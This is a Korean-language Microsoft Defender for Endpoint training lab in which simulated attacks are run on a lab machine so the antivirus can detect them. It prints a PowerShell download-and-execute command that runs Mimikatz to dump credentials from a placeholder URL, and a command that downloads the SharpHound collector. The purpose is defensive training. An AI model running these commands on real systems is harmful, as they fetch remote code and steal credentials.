# 모듈 2 데모 - 엔드포인트용 Microsoft Defender를 사용하여 위협 완화

**참고** 이 데모의 성공적인 완료는 [필수 구성 요소 문서](00-prerequisites.md)에 있는 모든 단계를 완료하는 것에 달려 있습니다.

## 시뮬레이션된 공격

이 작업에서는 두 가지 시뮬레이션 공격을 실행하여 엔드포인트용 Microsoft Defender의 기능을 살펴봅니다.

1. 브라우저의 Microsoft Defender XDR 포털에 아직 있지 않은 경우 테넌트의 관리자로 로그인된 Microsoft Defender XDR(https://security.microsoft.com))로 이동합니다.

*WIN1*에서 *PowerShell*을 사용하여 *시뮬레이션된* 공격을 실행하여 엔드포인트용 Microsoft Defender의 기능을 살펴보겠습니다.

`Attack 1: Mimikatz - Credential Dumping`

1. *WIN1* 컴퓨터에서 검색 창에 **명령**을 입력하고 **관리자 권한으로 실행**을 선택합니다.

1. **관리자: 명령 프롬프트** 창을 열고 **Enter** 키를 눌러 실행합니다.

    ```CommandPrompt
    powershell.exe "IEX (New-Object Net.WebClient).DownloadString('#{mimurl}'); Invoke-Mimikatz -DumpCreds"
    ```

1. *액세스가 거부되었습니다*라는 메시지와 *발견된 위협*을 표시하는 `Microsoft Defender Antivirus, Windows Security Virus and threats protection`의 팝업 메시지가 표시됩니다.

1. **관리자: 명령 프롬프트** 창을 **exit**를 입력하고 **Enter** 키를 눌러 종료합니다.

`Attack 2: Bloodhound - Collection`

1. *WIN1* 컴퓨터에서 검색 창에 **PowerShell**을 입력하고 **Windows PowerShell**을 선택한 다음 **관리자 권한으로 실행**을 선택합니다.

1. **관리자: Windows PowerShell** 창에 다음 명령을 복사하여 붙여넣고 **Enter** 키를 눌러 실행합니다.

    ```PowerShell
    New-Item -Type Directory "PathToAtomicsFolder\..\ExternalPayloads\" -ErrorAction Ignore -Force | Out-Null
    Invoke-WebRequest "https://raw.githubusercontent.com/BloodHoundAD/BloodHound/804503962b6dc554ad7d324cfa7f2b4a566a14e2/Ingestors/SharpHound.ps1" -OutFile "PathToAtomicsFolder\..\ExternalPayloads\SharpHound.ps1"
    ```

    >**참고:** 한 번에 하나씩 명령을 복사하여 붙여넣고 실행하는 것이 좋습니다. *메모장*을 열고 명령을 임시 파일에 복사하면 됩니다. 첫 번째 명령은 *Atomic Red Team* 폴더가 있는 동일한 폴더에 *ExternalPayloads*라는 폴더를 만듭니다. 두 번째 명령은 *BloodHound* GitHub 리포지토리에서 *SharpHound.ps1* 파일을 다운로드하여 *ExternalPayloads* 폴더에 저장합니다.

1. *발견된 위협*을 표시하는 `Windows Security Virus and threats protection`의 팝업 메시지가 표시되어야 합니다.

1. **관리자: Windows PowerShell** 창에 다음 명령을 복사하여 붙여넣고 **Enter** 키를 눌러 실행합니다.

    ```PowerShell
    Test-Path "PathToAtomicsFolder\..\ExternalPayloads\SharpHound.ps1"
    ```

1. 출력이 *True*이면 Microsoft Defender 바이러스 백신이 바이러스 백신 페이로드 파일을 제거하지 않은 것입니다. 출력이 *False*이면 바이러스 백신 페이로드 파일이 Microsoft Defender 바이러스 백신에 의해 제거된 것입니다. 출력이 *False*가 될 때까지 위쪽 화살표 키를 사용하여 명령을 반복합니다.

## 이 데모를 완료했습니다.
